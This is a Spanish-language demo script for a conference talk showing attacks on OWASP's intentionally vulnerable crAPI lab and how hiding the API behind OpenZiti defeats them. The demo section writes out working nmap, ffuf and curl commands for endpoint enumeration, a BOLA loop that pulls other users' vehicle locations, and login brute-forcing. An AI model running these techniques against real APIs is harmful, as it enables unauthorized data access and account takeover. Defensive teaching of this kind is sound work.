# Demo Script: "Exploit the Invisible: Demostrando Por Qué las Dark APIs Rompen el Playbook Ofensivo"
## HackGDL 2026 — Duración: 20 minutos

---

## PRE-REQUISITOS (preparar antes de subir al escenario)

### Setup en tu máquina

```bash
# Terminal A: crAPI corriendo (la API vulnerable)
docker-compose -f crapi/docker-compose.yml up -d
# Verificar: http://localhost:8888

# Terminal B: Lista para ataques (vacía, limpia)

# Terminal C: OpenZiti / NetFoundry (la Dark API corriendo)
# Asegurar que ziti tunnel esté activo y la misma API esté registrada como dark service

# Browser: crAPI UI abierta en http://localhost:8888
```

### Ventanas preparadas (antes de empezar)
- [ ] Terminal A: `docker-compose ps` mostrando crAPI healthy
- [ ] Terminal B: Vacía, prompt limpio
- [ ] Browser Tab 1: http://localhost:8888 (crAPI UI)
- [ ] Browser Tab 2: Slides de Reveal.js
- [ ] Nota sticky: IPs y puertos que usarás

---

## GUIÓN DETALLADO

---

## [00:00 - 00:02] HOOK — El Momento de Confusión del Atacante

**Pantalla:** Slide 1 — título + output de terminal

**Hablas:**
> "Imagínate. Eres pentester. Te contratan para auditar una API. Abres tu terminal, lanzas nmap, y ves esto..."

**Ejecutas en Terminal B:**
```bash
# Esto es lo que verás contra la Dark API (spoiler del final)
# Muéstralo PRIMERO para crear intriga
nmap -sV -p- dark.api.internal
# Output esperado: Host seems down. If it is really up, but blocking ICMP...
```

**Hablas:**
> "No hay puertos. No hay host. No hay nada. ¿Tu objetivo... desapareció?
> Hoy vamos a entender exactamente por qué esto pasa, y por qué es el futuro de la seguridad de APIs."

---

## [00:02 - 00:04] CONTEXTO — El Problema Real

**Pantalla:** Slide 2 — Stats de APIs expuestas

**Hablas (rápido, 2 min):**
> "Las APIs son el sistema nervioso de las aplicaciones modernas. El 83% del tráfico de internet es tráfico de API.
> Y el OWASP API Security Top 10 existe precisamente porque la mayoría están mal protegidas.
> Pero hay algo más fundamental que la protección: la **visibilidad**.
> Si tu API no existe en la red... no puede ser atacada."

**Key points en slide:**
- APIs = superficie de ataque #1 en 2025
- OWASP API Security Top 10
- La diferencia entre *proteger* y *oscurecer*

---

## [00:04 - 00:11] DEMO PARTE 1 — Atacando la API Pública Vulnerable (7 min)

**Pantalla:** Terminal B (full screen), slides intercalados como contexto

### [04:00] Reconocimiento con nmap

**Hablas:**
> "Empezamos el playbook ofensivo estándar. Reconocimiento."

**Ejecutas:**
```bash
# Descubrir la API en la red local
nmap -sV -p 8888,8025,8443 localhost
```

**Output esperado:**
```
PORT     STATE SERVICE VERSION
8888/tcp open  http    Nginx 1.21.x
8025/tcp open  http    (MailHog SMTP)
```

**Hablas:**
> "Tenemos puertos abiertos. Servicio HTTP. Ya tenemos algo que atacar."

---

### [04:45] Enumeración de Endpoints con ffuf

**Hablas:**
> "Siguiente paso: ¿qué endpoints tiene esta API?"

**Ejecutas:**
```bash
ffuf -u http://localhost:8888/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,201,401,403 \
     -t 50 \
     -o /tmp/endpoints.txt
```

**Output esperado (parcial):**
```
/api/v2/user/login      [Status: 200, Size: 234]
/api/v2/user/signup     [Status: 200, Size: 189]
/api/v2/user/dashboard  [Status: 401, Size: 45]
/api/v2/vehicle         [Status: 401, Size: 45]
/api/v2/community/posts [Status: 200, Size: 1204]
```

**Hablas:**
> "En segundos tenemos un mapa completo de la API. Ahora a explotar."

---

### [05:30] Explotación: BOLA/IDOR — Broken Object Level Authorization

**Hablas:**
> "crAPI tiene una vulnerabilidad clásica: BOLA — puedo acceder a datos de OTROS usuarios cambiando un ID."

**Setup rápido:**
```bash
# Primero: crear cuenta y hacer login para obtener token
TOKEN=$(curl -s -X POST http://localhost:8888/api/v2/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Password1@"}' | jq -r '.token')

echo "Token obtenido: ${TOKEN:0:40}..."
```

**Ejecutas el ataque BOLA:**
```bash
# Acceder a vehiculos de OTRO usuario cambiando el vehicleId
# vehicleId se obtiene de la respuesta del dashboard propio
for i in $(seq 1 5); do
  echo "=== Probando vehicleId: $i ==="
  curl -s http://localhost:8888/api/v2/vehicle/$i/location \
    -H "Authorization: Bearer $TOKEN" | jq '.carId, .lat, .long, .vehicleLocation'
done
```

**Output esperado:**
```
=== Probando vehicleId: 1 ===
"VICTIM_CAR_2847"
19.4284
-99.1276
"Colonia Polanco, CDMX"
```

**Hablas:**
> "Acabo de obtener la ubicación GPS de un vehículo de otro usuario. BOLA en 30 segundos."

---

### [06:30] Explotación: Sin Rate Limiting — Ataque de Fuerza Bruta

**Hablas:**
> "Siguiente: ¿hay rate limiting en el login? Spoiler: no."

**Ejecutas:**
```bash
# Ataque de fuerza bruta al endpoint de login
ffuf -u http://localhost:8888/api/v2/user/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"victim@test.com","password":"FUZZ"}' \
     -w /usr/share/wordlists/rockyou-top100.txt \
     -mc 200 \
     -t 20
```

**Hablas mientras corre:**
> "No hay captcha. No hay bloqueo por intentos. La API simplemente responde indefinidamente."

---

### [07:30] Explotación: Exposición de Datos Excesiva

**Ejecutas:**
```bash
# El endpoint de shop leaks datos internos
curl -s http://localhost:8888/api/v2/community/posts/recent \
  -H "Authorization: Bearer $TOKEN" | jq '.[0]'
```

**Output esperado:**
```json
{
  "id": 1,
  "title": "My new car",
  "content": "Just bought it!",
  "author": {
    "nickname": "victim_user",
    "email": "victim@company.com",    ← EMAIL FILTRADO
    "vehicleId": "VICTIM_CAR_2847",   ← ID FILTRADO
    "pincode": "1234"                  ← PINCODE EN TEXTO CLARO!!
  }
}
```

**Hablas:**
> "El API devuelve campos internos que nunca debería exponer. Incluyendo un pincode en texto claro.
> **Resumen de 7 minutos:** encontramos la API, enumeramos endpoints, explotamos BOLA, fuerza bruta sin límite, y datos expuestos. Esto es el OWASP API Top 10 en acción."

---

## [00:11 - 00:14] PAUSA CONCEPTUAL — Zero Trust y Dark APIs (3 min)

**Pantalla:** Slides conceptuales (NO terminal)

**Hablas:**
> "Ahora, antes de la segunda demo, necesito explicarte por qué esto no es un problema de configuración. Es un problema de arquitectura."

### Puntos clave en slides:

**Slide: El Modelo Tradicional**
```
Internet → Firewall → [API expuesta en puerto 443] → Backend
                           ↑
                    CUALQUIERA puede llegar aquí
```

**Slide: Zero Trust / Dark Service**
```
Internet → [NADA QUE VER]     ← No hay DNS, no hay IP, no hay puerto

Usuario legítimo con identidad → Broker ZT → API privada
                                      ↑
                           Solo identidades autorizadas
                           se "teleportan" al servicio
```

**Hablas:**
> "Con OpenZiti / NetFoundry, el API nunca abre un puerto al mundo. Hace una conexión **saliente** hacia el broker. Solo identidades con certificados válidos pueden acceder. Desde la red, el servicio literalmente no existe."

**Slide: Principios de Zero Trust**
1. Never trust, always verify
2. Assume breach
3. Minimize blast radius
4. **Dark services**: no exposure without identity

---

## [00:14 - 00:17] DEMO PARTE 2 — Los mismos ataques contra la Dark API (3 min)

**Pantalla:** Terminal B (full screen)

**Hablas:**
> "Misma API. Mismas vulnerabilidades en el código. Pero ahora detrás de OpenZiti como Dark Service. Repetimos el playbook."

### Ataque 1: nmap
```bash
nmap -sV -p- api.hackgdl.dark
```
**Output:**
```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 21.34 seconds
```

**Hablas:** "No hay host."

### Ataque 2: ffuf
```bash
ffuf -u http://api.hackgdl.dark/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
```
**Output:**
```
[Status: 000, Size: 0] :: Connection refused
:: Progress: [100/100] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:05] :: Errors: 100
```

**Hablas:** "No hay endpoints que enumerar."

### Ataque 3: curl directo
```bash
curl -v http://api.hackgdl.dark/api/v2/user/login
```
**Output:**
```
* Trying api.hackgdl.dark...
* connect to api.hackgdl.dark port 80 failed: Connection refused
curl: (7) Failed to connect to api.hackgdl.dark port 80: Connection refused
```

**Hablas:**
> "Connection refused. No hay TLS que analizar. No hay headers que ver. No hay nada.
> Desde la red pública, esta API **no existe**.
> El playbook ofensivo completo... falla en el primer paso."

### Acceso legítimo (contraste):
```bash
# Solo con la identidad ZT correcta (certificado OpenZiti)
# Esto sí funciona (mostrarlo brevemente):
curl -s https://api.hackgdl.dark/api/v2/user/dashboard \
     --cert ~/.ziti/client.crt \
     --key ~/.ziti/client.key \
     --cacert ~/.ziti/ziti-ca.crt \
     -H "Authorization: Bearer $LEGIT_TOKEN"
# Output: Respuesta normal del API
```

**Hablas:**
> "Un usuario legítimo con su identidad Zero Trust... funciona perfectamente. El API existe, pero solo para quien debe verla."

---

## [00:17 - 00:19] CÓMO IMPLEMENTARLO TÚ MISMO (2 min)

**Pantalla:** Slides con comandos clave

**Hablas:**
> "La buena noticia: esto no requiere hardware especial. OpenZiti es open source."

**Slide: Setup en 4 pasos**
```bash
# 1. Levantar controlador OpenZiti (self-hosted o usar NetFoundry SaaS)
docker run -d openziti/quickstart

# 2. Registrar tu API como Dark Service
ziti edge create service "mi-api" \
  --role-attributes api-service

# 3. Tu API no abre puertos, solo hace outbound al broker
# SDK disponible para: Node.js, Python, Go, Java

# 4. Identidades con certificados para acceso
ziti edge create identity device "mi-cliente" \
  --role-attributes api-clients
```

**Hablas:**
> "NetFoundry.io es el SaaS sobre OpenZiti si no quieres manejar la infraestructura. Ambos integran con MCP para agentes de IA también — que es otro caso de uso fascinante."

---

## [00:19 - 00:20] TAKEAWAYS + Q&A

**Pantalla:** Slide final

**Hablas:**
> "Para llevarse hoy:
> 1. **La exposición ES la vulnerabilidad**. No importa qué tan bien configures tu firewall si el puerto está abierto.
> 2. **Zero Trust no es un producto**, es una arquitectura. Y OpenZiti lo hace accesible.
> 3. **El playbook ofensivo asume visibilidad**. Quítala y el 90% de las técnicas no aplican.
> 4. **Esto funciona hoy**, con tu API actual, sin reescribir código."

**QR Code en slide:**
- GitHub del proyecto: `hackgdl-dark-api`
- OpenZiti: openziti.io
- crAPI: github.com/OWASP/crAPI

---

## PREGUNTAS FRECUENTES (preparadas)

**P: "¿Y si el atacante ya está dentro de la red?"**
R: Zero Trust asume exactamente eso. La identidad se verifica end-to-end, no solo en el perímetro.

**P: "¿Qué pasa con el latency del broker?"**
R: NetFoundry reporta <5ms overhead en sus data centers. Para la mayoría de APIs es imperceptible.

**P: "¿Cómo se manejan los health checks en Kubernetes?"**
R: Los readiness/liveness probes se configuran con identidades de servicio ZT. Hay operadores de K8s.

**P: "¿Esto reemplaza a un WAF?"**
R: No, son capas complementarias. El Dark Service elimina la superficie de ataque externa; un WAF protege el tráfico legítimo.

---

## CHECKLIST PRE-SHOW (30 min antes)

- [ ] `docker-compose ps` — todos los servicios de crAPI en "Up"
- [ ] `curl http://localhost:8888/api/v2/user/login` — responde
- [ ] Cuenta de attacker@test.com creada en crAPI
- [ ] Token válido en variable `$TOKEN`
- [ ] Cuentas de víctima en crAPI (victim@test.com)
- [ ] OpenZiti tunnel activo: `ziti tunnel verify`
- [ ] `nmap` contra dark service — confirma que falla
- [ ] ffuf instalado: `ffuf -V`
- [ ] jq instalado: `jq --version`
- [ ] Slides en browser, fullscreen listo
- [ ] Resolución de pantalla configurada para proyector (1920x1080)
- [ ] Terminal font size: mínimo 18px para visibilidad en sala

---

## ARCHIVOS NECESARIOS

```
hackgdl-dark-api/
├── DEMO_SCRIPT.md          ← este archivo
├── slides/
│   └── index.html          ← Reveal.js slides
├── attack-scripts/
│   ├── 01-recon.sh         ← nmap + ffuf
│   ├── 02-exploit-bola.sh  ← BOLA/IDOR
│   ├── 03-bruteforce.sh    ← Sin rate limiting
│   ├── 04-data-exposure.sh ← Datos excesivos
│   └── 05-dark-api-fail.sh ← Ataques que fallan
├── crapi/
│   └── docker-compose.yml  ← crAPI setup
└── openziti/
    ├── setup.sh            ← Setup del dark service
    └── README.md
```
